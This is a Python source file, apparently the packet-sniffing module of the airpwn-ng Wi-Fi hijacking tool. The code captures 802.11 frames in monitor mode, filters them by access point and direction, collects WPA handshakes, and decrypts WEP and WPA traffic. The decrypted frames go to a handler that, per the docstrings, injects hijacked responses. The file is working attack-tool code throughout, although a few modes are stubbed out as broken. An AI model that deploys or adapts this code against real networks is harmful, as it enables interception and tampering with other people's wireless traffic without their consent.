import sys
import time
from pyDot11 import *
from lib.visuals import Bcolors
from queue import Queue, Empty
from scapy.layers.dot11 import Dot11, Dot11WEP
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sniff
from threading import Thread

class Sniffer(object):
    """This is the highest level object in the library.

    It uses an instance of PacketHandler as the processing engine
    for packets received from scapy's sniff() function.
    """

    def __init__(self, packethandler, args, *positional_parameters, **keyword_parameters):
        self.m = keyword_parameters.get('m')
        if self.m is None:
            print ('[ERROR] No monitor interface selected')
            exit()

        self.packethandler = packethandler

        if args.wpa:

            ### DEBUG ~~> pcap intake
            self.shake = Handshake(psk = args.wpa, essid = args.essid, pcap = False)

            self.packethandler.injector.shake = self.shake

        ## Backpressure warnings
        self.bp = args.bWarn


    def sniff(self, q):
        """Target function for Queue (multithreading)"""
        sniff(iface = self.m, prn = lambda x: q.put(x), store = 0)


    def handler(self, q, m, pkt, args):
        """This function exists solely to reduce lines of code

        This function has been changed a bit to have the processing,
        moved to within the try: for WPA and WEP
        If errors are seen where pyDot11 fails to process, and
        airpwn-ng starts to hang, move self.packethandler.process()
        out from under the try/except like it previously was
        """

        ### This might need a different structure for self.shake bridge
        ### Multiple vics might collide...
        ## WPA
        if args.wpa:

            ### dict tk and use tgtMAC as key, tk as value
            #tk = self.shake.tgtInfo.get(self.tgtMAC)

            ## eType tagalong via packerhandler.eType when rdy for tkip
            eType = self.shake.encDict.get(self.tgtMAC)

            ### tkip vs ccmp decision pt for now
            if eType == 'ccmp':
                encKey = self.shake.tgtInfo.get(self.tgtMAC)[1]
            else:
                encKey = self.shake.tgtInfo.get(self.tgtMAC)[0]

            ## Decrypt
            try:
                self.packethandler.injector.shake.origPkt = pkt
                pkt,\
                self.packethandler.injector.shake.PN = wpaDecrypt(encKey,
                                                                  pkt,
                                                                  eType,
                                                                  False)
                #print pkt.summary()
            except:
                sys.stdout.write(Bcolors.FAIL + '\n[!] pyDot11 did not work\n[!] Decryption failed\n ' + Bcolors.ENDC)
                sys.stdout.flush()
                return

        ## WEP
        elif args.wep:

            ## Decrypt
            try:
                pkt, iVal = wepDecrypt(pkt, args.wep, False)
                #print pkt.summary()
            except:
                sys.stdout.write(Bcolors.FAIL + '\n[!] pyDot11 did not work\n[!] Decryption failed\n ' + Bcolors.ENDC)
                sys.stdout.flush()
                return

        ## Process and finish out the task
        self.packethandler.process(m, pkt, args)
        q.task_done()


    def threaded_sniff(self, args):
        """This starts a Queue which receives packets and processes them.

        It uses the PacketHandler.process function.
        Call this function to begin actual sniffing + injection.

        If args.b is thrown, a two-way sniff is implemented
        Otherwise airpwn-ng will only look at packets headed outbound
        While airpwn-ng only hijacks inbound frames to begin with,
        -b is useful for grabbing data inbound from a server

        Useful reminder:
            to-DS is:    1 (open) / 65 (crypted)
            from-DS is:  2 (open) / 66 (crypted)

        Need to look into sending other than 1/65 or 2/66
        Probably get more success...

        """
        q = Queue()
        sniffer = Thread(target = self.sniff, args = (q,))
        sniffer.daemon = True
        sniffer.start()

        ## Sniffing in Monitor Mode for Open wifi
        if args.mon == 'mon' and not args.wep and not args.wpa:

            """
            It is worth bringing up an error which should not occur, but does

              File "./airpwn-ng", line 210, in <module>
                main(args)
              File "./airpwn-ng", line 137, in main
                style.handler(args)
              File "/stuffz/bin/hub/myHub/_wifi/airpwn-ng/lib/styles.py", line 33, in handler
                snif.threaded_sniff(args) ## Here
              File "/stuffz/bin/hub/myHub/_wifi/airpwn-ng/lib/sniffer.py", line 178, in threaded_sniff
                if pkt[Dot11].FCfield == 1 and len(pkt) >= int(args.s):
              File "/usr/local/lib/python3.8/dist-packages/scapy/packet.py", line 1185, in __getitem__
                raise IndexError("Layer [%s] not found" % lname)
            IndexError: Layer [Dot11] not found

            Not sure why [Dot11] doesn't exist...
            """

            ## BSSID filtering and Speedpatch
            if args.bssid and not args.b:
                print('Speedpatch && BSSID filtering\n** Mode broken ~ wait for patch')
                exit(0)
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if pkt[Dot11].addr1 == args.bssid and pkt[Dot11].FCfield == 1 and len(pkt) >= int(args.s):
                            self.handler(q, self.m, pkt, args)
                        else:
                            pass
                    except Empty:
                        pass

            ## NO Speedpatch and NO BSSID filtering
            elif args.b and not args.bssid:
                print('No Speedpatch && No BSSID filtering')
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if (pkt[Dot11].FCfield == 1 or pkt[Dot11].FCfield == 2) and len(pkt) >= int(args.s):
                            self.handler(q, self.m, pkt, args)
                        else:
                            pass
                    except Empty:
                        pass

            ## BSSID filtering and NO Speedpatch
            elif args.bssid and args.b:
                print('No Speedpatch && BSSID filtering\n** Mode broken ~ wait for patch')
                exit(0)
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if (pkt[Dot11].addr1 == args.bssid and pkt[Dot11].FCfield == 1 and len(pkt) >= int(args.s)) or\
                            (pkt[Dot11].addr2 == args.bssid and pkt[Dot11].FCfield == 2 and len(pkt) >= int(args.s)):
                            self.handler(q, self.m, pkt, args)
                        else:
                            pass
                    except Empty:
                        pass

            ## Speedpatch and NO BSSID filtering
            else:
                print ('Speedpatch && No BSSID filtering')
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if pkt[Dot11].FCfield == 1 and len(pkt) >= int(args.s):
                            self.handler(q, self.m, pkt, args)
                    except Empty:
                        pass

        ## Sniffing in Monitor Mode for WEP
        elif args.mon == 'mon' and args.wep:

            ## BSSID filtering and Speedpatch
            if args.bssid and not args.b:
                #print 'BSSID filtering and Speedpatch\n'
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if pkt[Dot11].addr1 == args.bssid and pkt[Dot11].FCfield == 65 and len(pkt) >= int(args.s):
                            self.handler(q, self.m, pkt, args)
                        else:
                            pass
                    except Empty:
                        pass

            ## BSSID filtering and NO Speedpatch
            elif args.bssid and args.b:
                #print 'BSSID filtering and NO Speedpatch\n'
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if (pkt[Dot11].addr1 == args.bssid and pkt[Dot11].FCfield == 65 and len(pkt) >= int(args.s)) or (pkt[Dot11].addr2 == args.bssid and pkt[Dot11].FCfield == 66 and len(pkt) >= int(args.s)):
                            self.handler(q, self.m, pkt, args)
                        else:
                            pass
                    except Empty:
                        pass

        ## Sniffing in Monitor Mode for WPA
        elif args.mon == 'mon' and args.wpa:

            ## BSSID filtering and Speedpatch
            if args.bssid and not args.b:
                #print 'BSSID filtering and Speedpatch\n'
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)

                        if pkt.haslayer(EAPOL):
                            self.shake.eapolGrab(pkt)

                        elif pkt[Dot11].addr1 == args.bssid and pkt[Dot11].FCfield == 65 and len(pkt) >= int(args.s):
                            self.tgtMAC = False

                            ## MAC verification
                            if pkt.addr1 in self.shake.availTgts:
                                self.tgtMAC = pkt.addr1
                            elif pkt.addr2 in self.shake.availTgts:
                                self.tgtMAC = pkt.addr2

                            ## Pass the packet
                            if self.tgtMAC:
                                self.handler(q, self.m, pkt, args)
                            else:
                                pass
                        else:
                            pass
                    except Empty:
                        pass

            ## BSSID filtering and NO Speedpatch
            elif args.bssid and args.b:
                print('No Speedpatch && BSSID filtering')
                #print 'BSSID filtering and NO Speedpatch\n'
                while True:
                    try:
                        x = q.qsize()
                        if x > self.bp:
                            print('                                                                               {0} backpressure warning'.format(q.qsize()))
                        pkt = q.get(timeout = 1)
                        if pkt.haslayer(EAPOL):
                            self.shake.eapolGrab(pkt)

                        elif (pkt[Dot11].addr1 == args.bssid and pkt[Dot11].FCfield == 65 and len(pkt) >= int(args.s)) or (pkt[Dot11].addr2 == args.bssid and pkt[Dot11].FCfield == 66 and len(pkt) >= int(args.s)):
                            self.tgtMAC = False

                            ## MAC verification
                            if pkt.addr1 in self.shake.availTgts:
                                self.tgtMAC = pkt.addr1
                            elif pkt.addr2 in self.shake.availTgts:
                                self.tgtMAC = pkt.addr2

                            ## Pass the packet
                            if self.tgtMAC:
                                self.handler(q, self.m, pkt, args)
                            else:
                                pass
                        else:
                            pass
                    except Empty:
                        pass
